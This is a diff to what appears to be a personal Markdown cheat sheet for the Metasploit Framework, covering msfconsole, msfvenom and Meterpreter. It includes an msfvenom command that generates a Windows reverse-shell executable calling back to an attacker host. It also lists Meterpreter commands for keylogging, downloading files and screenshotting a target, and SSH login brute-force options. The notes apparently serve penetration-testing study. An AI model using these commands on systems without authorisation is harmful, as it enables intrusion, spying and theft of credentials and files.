@@ -75,18 +75,49 @@ Documentations on the scripts in Metasploit Framework
 ## Documentation
 ### Scripts/Files
 + msfconsole    : Metasploit Framework's Console Shell
-+ msfvenom      : MSF Backdoor utility
-
-### Synopsis/Syntax
+- msfvenom      : MSF Backdoor utility
+    ```
+    Generate and design a payload and output the payload file as an executable
+    ```
++ meterpreter   : A payload that is used for post-exploitation (Once you get access to the target machine)
+    
+### msfconsole
+#### Synopsis/Syntax
 
 - To startup the framework
     ```console
     $> msfconsole [{options} [arguments]...]
     ```
     
-### Parameters
+#### Parameters
++ -q                                : Quiet mode (Little to no information)
++ -x [msfconsole shell commands]    : Execute Metasploit msfconsole shell commands from the terminal
 
-### Commands
+#### Usage
+
+### msfvenom
+
+#### Synopsis/Syntax
+```console
+msfvenom {options} > payload_output_file
+```
+
+#### Parameters
++ -p [payload]                                          : Specify the payload to set in the executable
++ LHOST=[Listening Host (Client/Attacker) IP Address]   : Specify the Listener/Listening Host (Client/Attacker)
++ LPORT=[Listening Port Number]                          : Specify the port number to listen from
++ -f [file_extension_type]                              : Set the file extension/type of the output payload file
+
+#### Usage
+- Reverse TCP Payload
+    ```console
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker IP] LPORT=5555 -f exe > shell.exe
+    ```
+
+### Shell
+```
+The functions here are all executable command used in a generated Shell Environment.
+```
 #### msfconsole
 + search [keyword]              : Look for possible exploits containing the keyword
     ```console
@@ -107,8 +138,49 @@ Documentations on the scripts in Metasploit Framework
 + back                          : Go back to the original console prompt
 + clear                         : Clear the screen
 + exit                          : Exit from metasploit
-+ help                          : Show instructionsl
++ help                          : Show instructions
+- sessions {options} [arguments]
+    - Positional Arguments
+        + Default (Empty): View opened sessions
+            ```console
+            msf6 > sessions
+            ```
+        - Select a session
+            + Command : sessions [ID]
+    - Options
+        + -i : Get information about the current sessions
+        + -l : List all sessions (when using background)
+    - Suggestions
+        - Useful metasploit commands for Meterpreter control
+            + background : To show background current session
+            + sessions -l : To list all sessions (when using background)
+            + sessions -i [session_ID] : To interact with the session specified by session ID (also, to return to the current Meterpreter Mode)
 
+#### Meterpreter Mode
+- Keylogging
+    + keyscan_start : Start Keylogging
+    + keyscan_dump : Dump and output all keystrokes registered/logged
+    + keyscan_stop : Stop Keystroke sniffing
+- Information
+    + sysinfo : Show system information of the target machine
+    + ipconfig : Show network information of the target machine
+    + ps : Show processes running on the target machine
+    + getuid : To show a current user on the target machine
+    + pwd : To get current working directory
+    + ls : List directories
+    + cat : To view a file
+- File Management
+    + download : To download the file from the target machine
+    + upload : To upload the file to the target machine
+    + execute -f [file] : To execute the specified file
+- Actions
+    + screenshot : To take screenshots of the target machine
+- Movement
+    + cd : To change directory
+- Shell
+    - shell : To change the current shell to the one running on the OS of the target machine
+        + To return to the attacker shell : type *exit*
+        
 ### Usage
 
 - Information Gathering using Auxiliary Module
@@ -172,6 +244,28 @@ Documentations on the scripts in Metasploit Framework
             msf5 > set LHOST 10.0.2.4
             msf5 > exploit
             ```
+
+## Wiki
+
+### Scripts
+- auxiliary
+    > List of auxiliary
+    - auxiliary/scanner/ssh/ssh_login
+        - Options
+            + USERNAME [username] : Set the username
+            + USER_AS_PASS {true|false} : Set to use the username as the password
+            + USERPASS_FILE [filename] : Set your own list of username and passwords
+            + USER_FILE [filename] : Set your own list of usernames; User names only
+- exploits
+    > List of exploits
+    + exploit/multi/handler
+- payloads
+    >List of payloads
+    - Meterpreter
+        - Linux
+            + Reverse TCP : linux/x86/shell/reverse_tcp
+        - Windows
+            + Reverse TCP : windows/meterpreter/reverse_tcp 
 
 ### Terminologies
 + LHOST [attacker-IP]   : Sets the Local Host; Normally used to create a reverse connection to your machine after the attack succeeds
